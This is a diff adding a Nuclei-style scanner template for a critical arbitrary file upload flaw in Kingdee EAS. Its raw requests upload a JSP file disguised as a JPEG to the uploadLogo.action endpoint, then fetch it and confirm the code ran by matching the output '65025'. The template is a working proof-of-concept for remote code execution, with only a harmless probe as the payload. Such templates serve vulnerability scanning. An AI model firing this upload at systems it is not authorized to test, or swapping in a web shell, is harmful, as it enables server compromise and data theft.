@@ -1,0 +1,64 @@
+id: kingdeeeas-uploadlogo-upload
+
+info:
+  name: kingdeeeas-uploadlogo-upload
+  author: HB
+  severity: critical
+
+variables:
+  filename: "{{to_lower(rand_base(8))}}"
+
+http:
+  - raw:
+    - | 
+      POST /plt_portal/setting/uploadLogo.action HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
+      Connection: close
+      Content-Length: 700
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycxkT8bV6WLIUzm2p
+      Accept-Encoding: gzip, deflate
+
+
+      ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+      Content-Disposition: form-data; name="chooseLanguage_top"
+
+      ch
+      ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+      Content-Disposition: form-data; name="dataCenter"
+
+      xx
+      ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+      Content-Disposition: form-data; name="insId"  fragment-1641287796427
+
+      ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+      Content-Disposition: form-data; name="type"
+
+      top
+      ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+      Content-Disposition: form-data; name="upload"; filename="{{filename}}.jsp"
+      Content-Type: image/jpeg
+
+      <%{out.println(System.getProperty("user.name"));out.println(255*255);}%>
+      ------WebKitFormBoundarycxkT8bV6WLIUzm2p--
+
+    - |
+      GET /portal/res/file/upload/{{uploadfilename}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
+      Accept: */*
+    
+    extractors:
+      - type: regex
+        name: uploadfilename
+        group: 0
+        regex: 
+         - '\d+\.jsp'
+        internal: true
+
+    matchers:
+       - type: dsl
+         dsl:
+           - status_code==200 && contains_all(body_2,"65025")
+      
